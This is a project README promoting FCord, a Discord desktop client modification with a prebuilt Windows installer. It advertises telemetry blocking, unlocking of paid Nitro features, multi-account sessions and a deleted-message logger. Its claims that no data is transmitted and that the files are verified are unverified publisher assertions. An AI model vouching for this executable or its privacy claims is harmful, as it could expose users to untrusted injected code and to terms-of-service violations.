<div align="center">

# FCord

**High-performance desktop client modification engineered for Discord.**

[![Release](https://img.shields.io/github/v/release/ellecrydansmesdm/Fcord?color=5865F2&label=Release&style=flat-square)](https://github.com/ellecrydansmesdm/Fcord/releases/latest)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011%20(x64)-informational?style=flat-square)](https://github.com/ellecrydansmesdm/Fcord/releases/latest)
[![Security](https://img.shields.io/badge/Payload-ASAR%20Hardened-success?style=flat-square)](https://github.com/ellecrydansmesdm/Fcord/releases/latest)
[![Discord](https://img.shields.io/badge/Community-Discord%20Server-5865F2?style=flat-square)](https://discord.gg/W2YgEStqJ4)
[![License](https://img.shields.io/badge/License-GPL--3.0-lightgrey?style=flat-square)](LICENSE)

<br />

[Download Installer (.exe)](https://github.com/ellecrydansmesdm/Fcord/releases/latest/download/Fcord-Installer.exe) &nbsp;•&nbsp; [Offline Bundle (.zip)](https://github.com/ellecrydansmesdm/Fcord/releases/latest/download/fcord-dist.zip) &nbsp;•&nbsp; [Discord Server](https://discord.gg/W2YgEStqJ4) &nbsp;•&nbsp; [Releases](https://github.com/ellecrydansmesdm/Fcord/releases)

<br />

</div>

---

## Overview

FCord is an advanced, local-first client modification for Discord designed for performance enthusiasts, power users, and developers. Built on top of a zero-overhead runtime hook architecture, FCord extends the desktop Discord client with studio-grade audio processing, deep privacy evasion, multi-instance account management, and a modular ecosystem of over 770 integrated plugins.

---

## Core Architecture & Features

### 1. High-Fidelity DSP Soundpad & Audio Engine
- **In-Memory Audio Processing**: Native Web Audio API and Opus streaming pipeline with sub-millisecond audio playback latency.
- **Dynamic AGC & Anti-Clipping**: Real-time automatic gain control and acoustic peak limiting to prevent distortion and ear fatigue.
- **Flexible Output Routing**: Instant multi-mode switching between Microphone + Headset, Live Preview, or Dedicated Virtual Mic Channel.
- **Global Keybinding System**: System-level low-latency hooks for instant audio triggers across any full-screen application.

### 2. Stealth Evasion & Telemetry Isolation
- **Event Filtering Pipeline**: Dynamic interception and elimination of Discord telemetry dispatchers (`Science`, `Tracking`, `Sentry`, `Crashpad`).
- **Encrypted Local Vault**: Credentials and tokens stored with DPAPI / AES-256-GCM local encryption.
- **Zero Remote Dependencies**: Operates strictly within the local client runtime without remote proxying or external metric collection.

### 3. Multi-Instance & Account Session Manager
- **Parallel Discord Instances**: Run multiple independent Discord sessions concurrently on the same machine without process collisions.
- **Custom Instance Identity**: Distinct taskbar icons, window titles, and isolated user data directories per account.
- **Seamless Profile Hot-Swapping**: Switch active profiles without restarting or re-authenticating.

### 4. Client-Side Nitro & Customization Suite
- **Stream Quality Unlocked**: High-bitrate 1080p / 60 FPS screen sharing and streaming.
- **Media & Asset Enhancements**: Full support for custom external emojis, stickers, animated avatars, banners, and profile decorations.
- **High-Resolution Media Viewer**: Native image zooming, lossless audio previewing, and zip archive inspection.

### 5. Modular Plugin Matrix (770+ Plugins)
- **Zero-Latency In-Memory Patches**: Webpack module interception executed during module initialization with negligible startup overhead.
- **Deleted & Edited Message Logger**: Local-only persistent message audit log with diff highlighting.
- **Granular Settings Interface**: Fully responsive, searchable configuration interface with live reload.

---

## Downloads & Verification

The official releases are cryptographically verified and packaged in a standalone installer.

| File | Target Architecture | Size | Checksum (SHA-256) |
| :--- | :--- | :--- | :--- |
| **`Fcord-Installer.exe`** | Windows x64 (10 / 11) | 77.0 MB | `da96db71f6fb98ce3bd8446c9d297bd43d72d5887dcab36de0f0bcf6022e62c3` |
| **`fcord-dist.zip`** | Windows x64 (Offline) | 20.7 MB | `23ff13c859027920ca939e14f40ea94849566286f22552f3fc0b3964aa1c7b5f` |

---

## Installation Guide

### Prerequisites
- **Operating System**: Windows 10 / Windows 11 (64-bit)
- **Supported Discord Channels**: Discord Stable, Discord PTB, Discord Canary, Discord Development

### Quick Installation
1. Download **[`Fcord-Installer.exe`](https://github.com/ellecrydansmesdm/Fcord/releases/latest/download/Fcord-Installer.exe)** from the latest release.
2. Launch the installer.
3. Select your installed Discord channel (*Stable*, *PTB*, *Canary*, or *Development*).
4. Click **Install**. Discord will automatically restart with FCord activated.

### Uninstallation & Clean Restore
FCord maintains a non-destructive injection model. To revert Discord to its default state at any time:
1. Open **`Fcord-Installer.exe`**.
2. Select your Discord channel and click **Uninstall**.
3. The original Discord bootstrap is restored immediately with zero residual file modifications.

---

## Technical Specifications

| Parameter | Specification |
| :--- | :--- |
| **Runtime Environment** | Electron 34 / Chromium 132 / Node.js 20+ |
| **UI Framework** | React 19 / TypeScript 5.7 / Svelte 3 (Installer) |
| **Packaging & Format** | ASAR archive with custom integrity verification |
| **Memory Overhead** | < 15 MB additional RSS over baseline Discord |
| **Injection Mechanism** | In-process module patcher (`app_bootstrap` hook) |

---

## Security Disclosures & Privacy

- **Local Execution**: FCord executes entirely within your local Electron renderer and Node.js runtime. No tokens, messages, or keystrokes are transmitted to any third-party server.
- **Safety Best Practices**: Only download FCord from the official repository (`ellecrydansmesdm/Fcord`) to ensure file integrity and authentic SHA-256 signatures.

---

## Community & Contributing

- **Discord Server**: [Join the official community](https://discord.gg/W2YgEStqJ4) for support, announcements, and plugin discussions.
- **Issue Tracker**: For bug reports and technical feedback, submit an [Issue](https://github.com/ellecrydansmesdm/Fcord/issues).

---

## License

FCord is released under the **GNU General Public License v3.0**. See the [LICENSE](LICENSE) file for terms and conditions.
